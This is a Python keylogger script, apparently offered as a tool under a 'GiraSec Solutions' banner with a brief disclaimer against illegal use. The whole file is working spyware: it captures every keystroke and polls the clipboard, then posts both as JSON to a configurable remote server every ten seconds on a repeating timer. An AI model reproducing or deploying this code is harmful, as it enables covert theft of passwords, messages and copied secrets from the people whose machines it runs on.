"""
----------------------------------------------------
This project is owned by GiraSec Solutions!
Never use it for illegal actions!!
Armagedon
----------------------------------------------------
"""

from pynput import keyboard
import requests
import json
import threading
import time
import pyperclip

# Variables to store keystrokes and clipboard data
keystrokes = ""
clipboard_data = ""

# Server IP address and port number
server_ip = "<ip>"
server_port = "<port>"

# Time interval for sending data
send_interval = 10

def send_data_to_server():
    """
    Sends the collected keystrokes and clipboard data to the server at regular intervals.
    """
    global keystrokes, clipboard_data
    
    try:
        payload = json.dumps({"keyboardData": keystrokes, "clipboardData": clipboard_data})
        r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
        
        # Clear keystrokes and clipboard data after sending
        keystrokes = ""
        clipboard_data = ""
        
        # Set up the next call to this function
        timer = threading.Timer(send_interval, send_data_to_server)
        timer.start()
    except Exception as e:
        print("Couldn't complete request!", e)

def handle_key_press(key):
    """
    Handles the key press events and updates the keystrokes variable.
    """
    global keystrokes

    if hasattr(key, 'char'):
        keystrokes += key.char
    else:
        if key == keyboard.Key.enter:
            keystrokes += "\n"
        elif key == keyboard.Key.tab:
            keystrokes += "\t"
        elif key == keyboard.Key.space:
            keystrokes += " "
        elif key == keyboard.Key.backspace:
            if len(keystrokes) > 0:
                keystrokes = keystrokes[:-1]
        elif key == keyboard.Key.esc:
            return False

def monitor_clipboard():
    """
    Monitors clipboard for changes and updates clipboard_data variable.
    """
    global clipboard_data
    while True:
        try:
            new_clipboard_data = pyperclip.paste()
            if new_clipboard_data != clipboard_data:
                clipboard_data = new_clipboard_data
                time.sleep(1)  # Sleep to avoid rapid clipboard changes
        except Exception as e:
            print("Clipboard monitoring error:", e)
        time.sleep(2)  # Check clipboard every 2 seconds

# Start the keyboard listener
keyboard_listener = keyboard.Listener(on_press=handle_key_press)
keyboard_listener.start()

# Start clipboard monitoring in a separate thread
clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

# Start sending data to the server
send_data_to_server()
keyboard_listener.join()  # Wait for the keyboard listener to stop (never stops in this case)
